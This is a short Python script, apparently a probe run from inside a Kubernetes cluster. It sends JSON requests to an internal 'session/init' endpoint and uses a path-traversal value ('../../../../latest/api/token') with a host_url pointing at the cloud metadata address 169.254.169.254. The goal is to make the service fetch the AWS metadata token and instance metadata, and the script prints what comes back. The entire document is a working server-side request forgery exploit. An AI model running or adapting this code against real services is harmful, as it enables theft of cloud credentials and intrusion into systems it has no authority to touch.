import json, urllib.request, urllib.error
base='http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local/session/init'
for p in ['../../../../latest/api/token','../../../../latest/api/token?x-aws-ec2-metadata-token-ttl-seconds=21600','../../../../latest/meta-data/']:
 b=json.dumps({'user_id':'probe-token@armorerlabs.com','host_url':'http://169.254.169.254','project_path':p,'force':True}).encode()
 q=urllib.request.Request(base,b,method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'})
 try:
  x=urllib.request.urlopen(q,timeout=8); print(p,x.status,x.read(1000).decode('utf-8','replace'))
 except urllib.error.HTTPError as e: print(p,e.code,e.read(1000).decode('utf-8','replace'))
 except Exception as e: print(p,repr(e))
